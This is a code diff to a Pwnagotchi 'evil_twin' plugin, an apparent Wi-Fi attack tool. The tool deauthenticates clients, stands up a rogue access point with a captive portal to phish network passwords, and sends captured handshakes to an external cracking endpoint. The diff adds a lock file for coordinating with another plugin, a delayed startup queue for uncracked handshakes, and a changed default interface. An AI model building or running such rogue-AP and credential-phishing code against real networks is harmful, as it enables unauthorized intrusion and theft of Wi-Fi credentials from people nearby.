@@ -49,6 +49,9 @@ import pwnagotchi.plugins as plugins
 SUBMIT_URL  = "https://community-quickdic.mr-bumchinz.workers.dev/submit"
 USER_AGENT  = "pwnagotchi-evil_twin/1.0.0"
 
+# Lock file checked by neurolyzer so it pauses wlan0 operations during AP sessions
+_NEURO_LOCK = '/tmp/evil_twin_active'
+
 # ─── Captive portal HTML ──────────────────────────────────────────────────────
 _PORTAL_HTML = """<!DOCTYPE html>
 <html>
@@ -405,6 +408,11 @@ class _Session:
 
     def run(self):
         try:
+            # Tell neurolyzer to pause wlan0 operations for the duration of this session.
+            try:
+                open(_NEURO_LOCK, 'w').close()
+            except Exception:
+                pass
             self._setup_iface()
             self._start_hostapd()
             self._start_dnsmasq()
@@ -433,6 +441,10 @@ class _Session:
                 os.unlink(f)
             except Exception:
                 pass
+        try:
+            os.unlink(_NEURO_LOCK)
+        except Exception:
+            pass
 
 
 # ─── Pwnagotchi Plugin ────────────────────────────────────────────────────────
@@ -475,10 +487,19 @@ class EvilTwin(plugins.Plugin):
                                          name="evil_twin_worker")
         self._worker.start()
         logging.info("[evil_twin] loaded — AP:%s  mon:%s", iface_ap, iface_mon)
-        # Queue any stored handshakes that were never cracked. Pwnagotchi
-        # skips APs it already has a .pcap for, so on_handshake never fires
-        # for them again — we pick them up here instead.
-        self._queue_existing_uncracked()
+        # Queue any stored handshakes that were never cracked. Deferred so that
+        # pwnagotchi and bettercap are fully up before we start AP sessions
+        # (avoids a restart loop when neurolyzer fires early on startup).
+        startup_delay = int(self.options.get("startup_delay", 90))
+        if startup_delay > 0:
+            def _schedule():
+                time.sleep(startup_delay)
+                self._queue_existing_uncracked()
+            threading.Thread(target=_schedule, daemon=True,
+                             name="evil_twin_startup_queue").start()
+            logging.info("[evil_twin] startup queue deferred by %ds", startup_delay)
+        else:
+            self._queue_existing_uncracked()
 
     def on_unload(self, ui):
         self._running = False
@@ -551,7 +572,7 @@ class EvilTwin(plugins.Plugin):
                 pcap=pcap,
                 channel=_channel_from_pcap(pcap),
                 iface_ap=self.options.get("iface_ap", "wlan0"),
-                iface_mon=self.options.get("iface_mon", "wlan1mon"),
+                iface_mon=self.options.get("iface_mon", "wlan0mon"),
                 ap_ip=self.options.get("ap_ip", "10.0.99.1"),
                 portal_port=int(self.options.get("portal_port", 8080)),
                 deauth_rounds=int(self.options.get("deauth_rounds", 3)),
